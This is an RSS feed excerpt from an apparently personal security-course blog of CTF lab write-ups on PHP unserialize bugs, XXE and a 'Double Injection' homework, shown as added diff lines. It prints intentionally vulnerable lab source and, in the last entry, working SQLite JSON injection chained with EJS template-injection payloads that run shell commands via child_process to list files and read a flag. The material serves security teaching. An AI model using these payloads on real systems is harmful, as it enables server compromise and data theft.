+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Cat
+{
+ public $name = &amp;#39;(guest cat)&amp;#39;;
+ function __construct($name)
+ {
+ $this-&amp;gt;name = $name;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
+ system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
+ echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
+ }
+}
+
+if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
+ $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
+ setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
+} else {
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
+}
+?&amp;gt;
+&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
+&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+ Simple Web 0x18(Lab - Magic Cat)
+ &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>None&amp;hellip;&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Magic
+{
+ function cast($spell)
+ {
+ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
+ }
+}
+
+// Useless class?
+class Caster
+{
+ public $cast_func = &amp;#39;intval&amp;#39;;
+ function cast($val)
+ {
+ return ($this-&amp;gt;cast_func)($val);
+ }
+}
+
+
+class Cat
+{
+ public $magic;
+ public $spell;
+ function __construct($spell)
+ {
+ $this-&amp;gt;magic = new Magic();
+ $this-&amp;gt;spell = $spell;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;Cat Wakeup!\n&amp;#34;;
+ $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
+ }
+}
+
+if (isset($_GET[&amp;#39;spell&amp;#39;])) {
+ $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
+} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
+ echo &amp;#34;Unserialize...\n&amp;#34;;
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
+} else {
+ $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
+}
+?&amp;gt;
+&amp;lt;pre&amp;gt;
+This is your 🐱:
+&amp;lt;?php var_dump($cat) ?&amp;gt;
+&amp;lt;/pre&amp;gt;
+
+&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+ Simple Web 0x23(Lab - XXE)
+ &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input
+取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
+:::spoiler XXE course lecture
+&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
+:::
+:::spoiler exploit type
+&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+ $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
+ if (!$xmlfile) die(show_source(__FILE__));
+
+ $dom = new DOMDocument();
+ $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+ $creds = simplexml_import_dom($dom);
+ $user = $creds-&amp;gt;user;
+ echo &amp;#34;You have logged in as user $user&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
+ Exploit - XXE
+ &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Normal Usage in this webpage&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
+ Simple Web 0x41(2023 HW - Double Injection - FLAG1)
+ &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>Time Based SQLi
+:::info
+建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler init-db.js&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">verbose&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">FLAG1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">readFileSync&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/flag1.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">trim&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span>.&lt;span style="color:#a6e22e">Database&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/etc/db.sqlite3&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">db&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">`
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DROP TABLE IF EXISTS users;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">CREATE TABLE db (
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> users JSON NOT NULL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">);
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">INSERT INTO db(users) VALUES (&amp;#39;{
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;admin&amp;#34;: {
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">FLAG1&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> },
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;guest&amp;#34;: {
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;guest&amp;#34;,
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;guest&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> }
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
+:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
+ Simple Web 0x42(2023 HW - Double Injection - FLAG2)
+ &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>Node JS ejs SSTI&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>呈上題&lt;/p>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
+&lt;img src="https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png" alt="" />
+基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- #
+&lt;/code>&lt;/pre>&lt;p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看&lt;a href="https://hackmd.io/@SBK6401/HkgkDNsPp">之前寫的文章&lt;/a>&lt;/p>
+&lt;h2 id="exploit---ejs-ssti-rce">
+ Exploit - Ejs SSTI RCE
+ &lt;a class="anchor" href="#exploit---ejs-ssti-rce">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Payload 1:
+&lt;ul>
+&lt;li>Username:
+&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;ls -al /&amp;#34;).toString() %&amp;gt;
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
+&lt;li>Result:
+&lt;pre tabindex="0">&lt;code>total	76	
+drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
+drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
+-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
+drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
+drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
+drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
+-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
+-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
+drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
+drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
+drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
+drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
+drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
+dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
+drwx------	1	root	root	4096	Dec	11	18:36	root	
+drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
+drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
+drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
+dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
+drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
+drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
+drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Payload 2:
+&lt;ul>
+&lt;li>Username:
+&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&amp;#34;).toString() %&amp;gt;
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
+&lt;li>Result: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item></channel></rss>
